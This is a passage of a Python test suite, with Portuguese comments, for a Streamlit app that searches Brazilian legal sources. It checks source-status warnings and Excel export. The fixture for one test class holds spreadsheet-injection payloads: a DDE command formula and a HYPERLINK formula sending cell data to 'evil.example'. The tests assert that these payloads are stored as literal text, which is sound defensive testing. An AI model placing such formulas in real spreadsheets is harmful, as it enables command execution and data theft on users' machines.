    at = AppTest.from_file("app.py", default_timeout=30)
    at.session_state["wizard_step"] = 4
    at.session_state["search_done"] = True
    at.session_state["results"] = list(results)
    at.session_state["keyword_statuses"] = list(kw_statuses)
    at.run()
    assert not at.exception, at.exception
    return at


class TestAvisoPorFonte:
    def test_sem_resultado_nenhum_o_aviso_nao_diz_que_veio_da_web_aberta(self):
        # Review da T9, F2: lexml e tcu mortos, google em rate_limit, 0 resultados.
        from models import KeywordStatus as KS
        diag = [KS(keyword="k", source="lexml", status="error", motivo="bloqueio_waf", detalhe="d"),
                KS(keyword="k", source="tcu", status="error", motivo="http_5xx", detalhe="d"),
                KS(keyword="k", source="google", status="error", motivo="rate_limit", detalhe="d")]
        avisos = " ".join(w.value for w in _apptest_passo4(diag).warning)
        assert "Nenhuma fonte catalogada" in avisos
        assert "vem só da web aberta" not in avisos
        assert "A web aberta também não entregou resultado." in avisos

    def test_lexml_morto_tcu_saudavel_nao_diz_nenhuma_fonte_catalogada(self):
        # Revisao final, N1 (bloqueador): o aviso "Nenhuma fonte catalogada entregou"
        # saia com o card do TCU na tela, porque nao conferia que TODAS morreram.
        from models import KeywordStatus as KS
        diag = [KS(keyword="k", source="lexml", status="error", motivo="bloqueio_waf", detalhe="d"),
                KS(keyword="k", source="tcu", status="ok", result_count=1)]
        avisos = " ".join(w.value for w in _apptest_passo4(diag, [_make_result(source="tcu")]).warning)
        assert "Nenhuma fonte catalogada" not in avisos
        assert "Cobertura incompleta" in avisos and "lexml indisponível (bloqueio_waf)" in avisos
        assert "tcu indisponível" not in avisos and "tcu respondeu" not in avisos   # so a morta e listada


# ---------------------------------------------------------------------------
# Revisao final da frente 2 (trilha FIX-SAIDA): o que a planilha e a tela
# afirmavam de falso. O id do achado (final-triagem.md) vai no nome da classe.
# ---------------------------------------------------------------------------

# Campos de texto da aba Normativos, cada um com uma formula de verdade (repro
# do security-auditor: DDE e exfiltracao por HYPERLINK ao abrir o .xlsx).
_FORMULAS = {
    "nome": '=cmd|"/c calc"!A0',
    "ementa": '=HYPERLINK("http://evil.example/"&A1,"clique")',
    "tipo": "=1+1", "numero": "=2+2", "data": "=TODAY()", "orgao_emissor": "=A1",
    "link": '=HYPERLINK("http://evil.example")', "categoria": "=B2", "situacao": "=C3",
}


class TestSecFormulaNaAbaNormativos:
    """S-SEC (critico): nenhuma celula da aba Normativos vira formula; o texto fica LITERAL."""

    def _planilha(self):
        return generate_excel([_make_result(**_FORMULAS)], "t")

    def test_reload_da_tipo_string_e_valor_identico(self):
        ws = _load_workbook_from_buffer(self._planilha()).active
        campos = [campo for _, _, campo in COLUMNS]
        for campo, texto in _FORMULAS.items():
            c = ws.cell(row=3, column=campos.index(campo) + 1)
            assert c.data_type == "s", (campo, c.data_type)
            assert c.value == texto, campo                     # sem apostrofo, sem troca de caractere

    def test_xml_salvo_nao_tem_elemento_formula(self):
        import zipfile
        with zipfile.ZipFile(self._planilha()) as z:
            xml = z.read("xl/worksheets/sheet1.xml").decode("utf-8")
            nomes = z.namelist()
            compartilhadas = z.read("xl/sharedStrings.xml").decode("utf-8") if "xl/sharedStrings.xml" in nomes else ""
        assert "<f>" not in xml and "<f " not in xml
        assert "=cmd|" in (xml + compartilhadas).replace("&quot;", '"')   # gravado como texto


class TestN8KeywordLiteralNoDiagnostico:
    """S-N8: a palavra-chave e a fonte vao LITERAIS para a aba de diagnostico."""

    def test_keyword_com_cara_de_segredo_nao_e_redigida(self):
        diag = [_KS(keyword="token=abc", source="lexml", status="empty")]
        ws = _load_workbook_from_buffer(generate_excel([], "t", diagnostico=diag))[DIAGNOSTICO_SHEET]
        assert ws.cell(row=3, column=2).value == "token=abc"

    def test_keyword_e_fonte_com_formula_ficam_texto_literal(self):
        diag = [_KS(keyword="=1+1", source="=cmd", status="empty")]
        ws = _load_workbook_from_buffer(generate_excel([], "t", diagnostico=diag))[DIAGNOSTICO_SHEET]
        for col, texto in ((1, "=cmd"), (2, "=1+1")):
            c = ws.cell(row=3, column=col)
            assert (c.value, c.data_type) == (texto, "s")

    def test_keyword_com_caractere_de_controle_nao_derruba_a_exportacao(self):
        diag = [_KS(keyword="a\x07b", source="lexml", status="empty")]
        ws = _load_workbook_from_buffer(generate_excel([], "t", diagnostico=diag))[DIAGNOSTICO_SHEET]
        assert ws.cell(row=3, column=2).value == "ab"          # openpyxl recusa o char; o resto fica


_NOTA_CONTROLE = "tinham caracteres de controle não representáveis em .xlsx"


def _notas_controle(ws) -> list[str]:
    return [c.value for linha in ws.iter_rows() for c in linha
            if isinstance(c.value, str) and _NOTA_CONTROLE in c.value]


class TestControleNaoDerrubaExportacao:
    """Review da FIX-SAIDA: um char de controle (a quebra manual do Word, \\x0b) na ementa
    fazia a exportacao INTEIRA falhar ("Erro ao gerar Excel")."""

    def test_nome_e_ementa_com_controle_exportam_e_registram_a_nota(self):
        r = _make_result(nome="x\x01y", ementa="a\x0bb")
        wb = _load_workbook_from_buffer(generate_excel([r], "t"))
        campos = [campo for _, _, campo in COLUMNS]
        ws = wb.active
        assert ws.cell(row=3, column=campos.index("nome") + 1).value == "xy"
        assert ws.cell(row=3, column=campos.index("ementa") + 1).value == "a\nb"   # quebra manual -> quebra de linha
        notas = _notas_controle(wb[DIAGNOSTICO_SHEET])
        assert len(notas) == 1 and notas[0].startswith("2 célula(s) ")

    def test_keyword_com_controle_soma_na_mesma_nota(self):
        diag = [_KS(keyword="a\x07b", source="lexml", status="empty")]
        wb = _load_workbook_from_buffer(generate_excel([_make_result(ementa="a\x0cb")], "t", diagnostico=diag))
        notas = _notas_controle(wb[DIAGNOSTICO_SHEET])
        assert len(notas) == 1 and notas[0].startswith("2 célula(s) ")

    def test_sem_controle_sem_nota(self):
        diag = [_KS(keyword="k", source="lexml", status="empty")]
        wb = _load_workbook_from_buffer(generate_excel([_make_result()], "t", diagnostico=diag))
        assert _notas_controle(wb[DIAGNOSTICO_SHEET]) == []

    def test_texto_xlsx_conta_os_chars_trocados(self):
        from excel_export import _texto_xlsx
        assert _texto_xlsx("a\x0bb\x0cc\x01d") == ("a\nb\ncd", 3)
        assert _texto_xlsx("Lei n. 8.666\n\ttexto") == ("Lei n. 8.666\n\ttexto", 0)   # \n e \t sao legais


class TestUX1ParcialNaoEIndisponivel:
    """S-UX1+N3: error+parcial (TCU: um endpoint caiu, o outro respondeu) e 'Parcial'."""

    def test_rotulo_parcial(self):
        s = _KS(keyword="k", source="tcu", status="error", motivo="http_5xx", result_count=3, parcial=True)
        assert rotulo_status(s) == "Parcial"

    def test_planilha_rotula_parcial(self):
        diag = [_KS(keyword="k", source="tcu", status="error", motivo="http_5xx", result_count=3, parcial=True)]
        ws = _load_workbook_from_buffer(generate_excel([], "t", diagnostico=diag))[DIAGNOSTICO_SHEET]
        assert ws.cell(row=3, column=3).value == "Parcial"

    def test_tela_secao_e_metrica_proprias(self):
        diag = [_KS(keyword="k", source="tcu", status="error", motivo="http_5xx", result_count=3, parcial=True,
                    detalhe="Acórdãos: ok (500 itens); Atos: http_5xx em HTTP 500")]
        at = _apptest_passo4(diag, [_make_result(source="tcu")])
        md = " ".join(m.value for m in at.markdown)
        assert "Fontes indisponíveis" not in md and "Fontes parciais" in md
        metricas = {m.label: m.value for m in at.metric}
        assert metricas["Indisponíveis"] == "0" and metricas["Parciais"] == "1"
        assert any("1 parciais" in e.label for e in at.expander)

    def test_parcial_sem_match_avisa_e_nao_diz_com_sucesso(self):
        # N3: paginacao interrompida (empty+parcial) e endpoint caido (error+parcial), 0 resultado
        diag = [_KS(keyword="a", source="tcu", status="empty", parcial=True, detalhe="pagina 2: http_5xx"),
                _KS(keyword="b", source="tcu", status="error", motivo="http_5xx", parcial=True, detalhe="Atos: 500")]
        at = _apptest_passo4(diag)
        assert not any("Tente ampliar" in i.value for i in at.info)
        assert not any("não puderam consultar a fonte" in e.value for e in at.error)
        avisos = " ".join(w.value for w in at.warning)
        assert "coleta parcial" in avisos and "tcu respondeu parcialmente" in avisos
        assert not any("com sucesso" in c.value for c in at.caption)

    def test_empty_sem_parcial_continua_com_sucesso(self):
        at = _apptest_passo4([_KS(keyword="a", source="tcu", status="empty")])
        assert any("com sucesso" in c.value for c in at.caption)
        assert any("Tente ampliar" in i.value for i in at.info)


def _apptest_passo3(kw_statuses, results=()):
    """Como _apptest_passo4, mas no Passo 3 com a busca ja feita (o resumo verde/amarelo/vermelho)."""
    from streamlit.testing.v1 import AppTest
    at = AppTest.from_file("app.py", default_timeout=30)
    at.session_state["wizard_step"] = 3
    at.session_state["search_done"] = True
    at.session_state["results"] = list(results)
    at.session_state["keyword_statuses"] = list(kw_statuses)
    at.run()
    assert not at.exception, at.exception
    return at


class TestN9Passo3NaoDizConcluidaVerde:
    """S-N9: 'Busca concluida' verde com todas as fontes indisponiveis era falso."""

    def test_tudo_indisponivel_nao_e_verde(self):
        diag = [_KS(keyword="k", source="lexml", status="error", motivo="bloqueio_waf"),
                _KS(keyword="k", source="tcu", status="error", motivo="http_5xx")]
        at = _apptest_passo3(diag)
        assert not at.success
        assert any("indisponíveis" in e.value for e in at.error)

    def test_busca_saudavel_continua_verde(self):
        at = _apptest_passo3([_KS(keyword="k", source="tcu", status="ok", result_count=1)], [_make_result()])
        assert any("Busca concluida - 1 normativos" in s.value for s in at.success)

    def test_resumo_da_busca_do_status_de_progresso(self):
        from app import _resumo_da_busca
        todas = [_KS(keyword="k", source="lexml", status="error", motivo="timeout"),
                 _KS(keyword="j", source="lexml", status="error", motivo="nao_consultada")]
        assert _resumo_da_busca(0, todas)[0] == "error"
        mista = todas + [_KS(keyword="k", source="tcu", status="ok", result_count=2)]
        assert _resumo_da_busca(2, mista)[0] == "warning"
        assert _resumo_da_busca(2, [_KS(keyword="k", source="tcu", status="ok", result_count=2)]) == \
            ("success", "Busca concluida - 2 normativos encontrados")


# ===========================================================================
#  Run via pytest or direct execution
# ===========================================================================

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
